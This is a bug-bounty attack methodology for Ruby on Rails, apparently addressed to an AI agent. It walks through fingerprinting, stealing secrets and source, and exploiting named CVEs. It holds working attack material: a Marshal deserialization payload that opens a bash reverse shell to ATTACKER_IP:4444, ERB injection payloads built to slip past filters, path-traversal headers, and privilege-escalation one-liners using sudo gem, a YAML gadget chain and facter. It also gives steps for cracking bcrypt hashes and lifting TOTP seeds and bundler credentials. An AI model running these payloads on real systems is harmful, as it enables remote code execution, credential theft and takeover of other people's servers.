---
technology: "Ruby on Rails"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
layer: full-stack Ruby web framework attack method
version: 1.0
source: "corpus-mined + upstream-verified (advisories listed in ruby-on-rails.md provenance)"
provenance: "chains distilled from the same gated corpus as the overview page plus upstream advisories; CVE numbers, version gates, and gadget mechanics verified against primary sources before writing. Companion page: [[ruby-on-rails]]."
---

# Ruby on Rails — bug-bounty methodology

Companion overview: [[ruby-on-rails]]. Phase order matters: the version/repo oracle comes first because most of what follows is version- or config-gated.

## Phase 1 — Fingerprint the stack

Signatures that identify Rails (or its Ruby-web neighborhood) before any exploit:

- Response headers: `X-Runtime`, `X-Request-Id` on static pages; `Server: nginx/... + Phusion Passenger` or `X-Powered-By: Phusion Passenger` (Passenger = Ruby app server, nginx fronting).
- Cookie names: anything ending `_rails_session` (the prefix is the app name); the value is a long Base64 blob (Marshal + AES-HMAC).
- Forms: hidden `authenticity_token` field in every POST form (CSRF token — Rails fingerprint, and a value you must replay in crafted requests).
- Assets: `/packs/js/application-<digest>.js` (Webpacker/Propshaft fingerprinted assets); `config.ru`, `Gemfile`, `Gemfile.lock`, `.ruby-version` in any leaked directory listing.
- Error pages / stack traces: unhandled exceptions print `Rails version: X.Y.Z` and the Ruby revision — record both.
- Sibling services: check every open port for **gitweb** — a gitweb listing of the app's own repo is the cheapest full-source disclosure there is (`config.ru` → `run` line names the app; `Gemfile` → exact framework and gem pins).
- Footer strings: `Powered by WEBrick` marks the lighter Ruby web stack — everything ERB/Psych/bundler below applies, full-Rails machinery (sessions, cache stores) may not.

Decision point: exact Rails version known? That number decides which deserialization and file-read paths apply. Version unknown? Chase the repo/source leak first.

## Phase 2 — Source and config loot (when any file read or repo access exists)

Priority order for files, from highest value down:

1. `config/secrets.yml` / `config/master.key` + `config/credentials.yml.enc` — `secret_key_base` turns cookie forging into RCE.
2. `Gemfile` + `Gemfile.lock` — exact pins (`gem 'rails', '= 5.2.2.1'`); grep the lock for known-bad gems.
3. Controllers/models — grep the app for the dangerous idioms:
   - `raw: true` inside `Rails.cache.fetch` — CVE-2020-8165 setup (Phase 3).
   - `ERB.new` or template render over user input — SSTI (Phase 4).
   - `params.permit!` — mass assignment (Phase 6).
   - `render file:` — CVE-2019-5418 pairing (Phase 5).
   - `YAML.load` / `Psych.load` (not `safe_load`) on any file a low-privilege user can write — gadget chain (Phase 8).
4. Database files: `db/development.sqlite3` in dev-shaped deployments — the `schema_migrations`/`ar_internal_metadata` tables confirm ActiveRecord; the `users` table's `password_digest` column is bcrypt; crack with john or hashcat (mode 3200) against rockyou.
5. `~/.bundle/config` — bundler embeds gem-source credentials as `BUNDLE_HTTPS://RUBYGEMS__ORG/: "user:password"` — a real reuse vector.
6. Backups: `/var/backups/dump_*.sql` (pg_dump) — same `password_digest` loot.

## Phase 3 — Cache-store deserialization (CVE-2020-8165)

Upstream facts (verified, GitHub Advisory GHSA-2p68-f74v-9wc6 + rubyonrails-security): ActiveSupport's MemCacheStore and RedisCacheStore unmarshal user-provided objects; affected Rails 5.0.0–5.2.4.2 and 6.0.0–6.0.3; patched in 5.2.4.3 and 6.0.3.1. The backend store (see [[redis]]) is irrelevant — the bug is the unmarshalling in ActiveSupport.

Chain, as it runs in the field:

```ruby
# vulnerable controller code you are looking for:
Rails.cache.fetch("username_#{session[:user_id]}", raw: true) do
  params[:user][:username]        # your bytes, stored "raw"
end

# craft the Marshal payload (irb) — the classic gadget:
payLoad = "\x04\x08" +
  "o:\x40ActiveSupport:\x3ADeprecation\x3ADeprecatedInstanceVariableProxy" +
  "\x09:\x0E@instanceo:\x08ERB\x08:\x09@srcI\"" +
  "`/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"`" +
  "\x06:\x06ET:\x0E@filenameI\"\x01x\x06;\x09T:\x0C@linenoi\x00:\x0C@method:\x0Bresult:" +
  "\x09@varI\"\x0C@result\x06;\x09T:\x10@deprecatorI" +
  "\x1FActiveSupport:\x3ADeprecation\x00\x06;\x09T"
puts URI.encode_www_form(payload: payLoad)   # URL-encode for transport
```

Delivery: any parameter that lands in a `raw: true` cache write — a profile-update form field is the canonical one. POST it (keep the `authenticity_token`, `_method=patch` on Rails form routes). The gadget fires when the cached entry is read back: `DeprecatedInstanceVariableProxy` calls `ERB#result`, whose `@src` is your backticked command. Catch with a listener (`nc -lvnp 4444`).

Fallback if no `raw: true` exists: a leaked `secret_key_base` plus a Marshal session/cookie gives the same gadget without the cache — target `experimentation_subject_id`-style cookie keys.

## Phase 4 — ERB template injection (framework-independent Ruby class)

Works on any Ruby app that renders ERB from user input — WEBrick and Sinatra apps included. The filter-bypass lore is the value here:

- Probe: submit `<%= 7*7 %>` — reflected `49` (or an arithmetic result in the output) confirms evaluation.
- Filters that block `<%=` fall to URL-encoding in the request body: `category1=test%0A%3C%25%3D+IO.popen(%22sleep+10%22).readlines()%25%3D` — the `%0A` newline splits the payload off the logged prefix, `%3C%25%3D` is `<%=`.
- Confirm blind with a time delay (`IO.popen("sleep 10")`), then swap in `IO.popen("...").readlines()` for command output or a reverse shell.

## Phase 5 — File-read patterns

- CVE-2019-5418 (Action View, verified against the rubyonrails-security post): any controller calling `render file:` without an explicit format lets a crafted `Accept` header pick the file rendered — `Accept: ../../../../etc/passwd{{`. Fixed in 6.0.0.beta3/5.2.2.1/5.1.6.2/5.0.7.2/4.2.11.1; `render file: ..., formats: [:html]` is the backport. Read `config/secrets.yml` first, then `config/master.key`.
- API-era variant: download/export endpoints like `GET /download?filename=<value>` — filenames are app-generated tokens, but the parameter is still worth `../` traversal and absolute-path probes; blind-verify by requesting a value you control the bytes of (upload then download).

## Phase 6 — Mass assignment

Rails' strong parameters protect exactly what developers enumerate. Find the opt-outs:

- `params.permit!` in a controller (grep for it) whitelists every key — if the model has a `role`/`admin`/`is_admin` column, a password-change or profile-update request carrying `user[role]=administrator` sets it. Verified field instance: Camaleon CMS before 2.9.1, CVE-2025-2304 — the `updated_ajax` method of UsersController accepted unfiltered parameters, escalating a self-service password change to admin.
- Softer variant: nested params (`password[role]`) smuggled into an update that only expects `password[current]/[new]`.
- Enumerate columns first: leak the schema (Phase 2, SQLite/`ar_internal_metadata`) so you know which attribute names exist before guessing.

## Phase 7 — Web-tier and dependency bugs in Ruby apps

- pdfkit (URL→PDF services, fingerprinted by the PDF `Creator: Generated by pdfkit vX.Y` metadata tag): CVE-2022-25765, command injection — the URL passed to pdfkit is not sanitized before it reaches a shell for wkhtmltopdf; versions before 0.8.7.2 wrap URL bytes in backticks and execute. Test by feeding the converter a URL you host with backtick-wrapped callbacks (`http://ATTACKER_IP/` + encoded metacharacters) and watch your listener.
- SSRF equivalents: any "fetch this URL" Ruby feature is a direct internal-network probe.

## Phase 8 — Post-shell Ruby paths (the language as the privesc surface)

- `sudo -l` listing `/usr/bin/gem`: `sudo gem open -e "/bin/sh -c /bin/sh" rdoc` (gem's editor option executes).
- Root-run Ruby scripts that read YAML: replace the readable `dependencies.yml` with the Psych gadget chain (objects `Gem::Installer`, `Gem::SpecFetcher`, `Gem::Requirement`, `Gem::Package::TarReader`, `Net::WriteAdapter` terminating in `!ruby/module 'Kernel'` + `method_id: :system` with the command in `git_set`) — unsafe `YAML.load` executes on parse.
- `sudo facter` (or any root-run tool with a plugin dir): `echo 'import os; os.system("/bin/bash")'`-class Ruby custom facts in `--custom-dir`, run as root.
- TOTP-protected sudo: `~/.google_authenticator` holds the seed; `oathtool -b --totp '<seed>'` generates the code.

## Tool quick reference

- Fuzzing/content: ffuf or gobuster with directory wordlists, plus `SecLists/Discovery/Web-Content/raft-*` for Rails-y paths (`/admin`, `/login`, `/users`).
- Hash cracking: john (`--wordlist=rockyou`, bcrypt) or hashcat `-m 3200`.
- Marshal payload crafting: plain irb + `URI.encode_www_form`; listener `nc -lvnp`.
- TOTP: oathtool.

## Disclosure notes

Cache deserialization and mass-assignment reports should attach the controller snippet (`raw: true` / `permit!`) and the affected version range; ERB injection reports should show the arithmetic probe. Session-cookie RCE reports must never include a live `secret_key_base` — mask it.
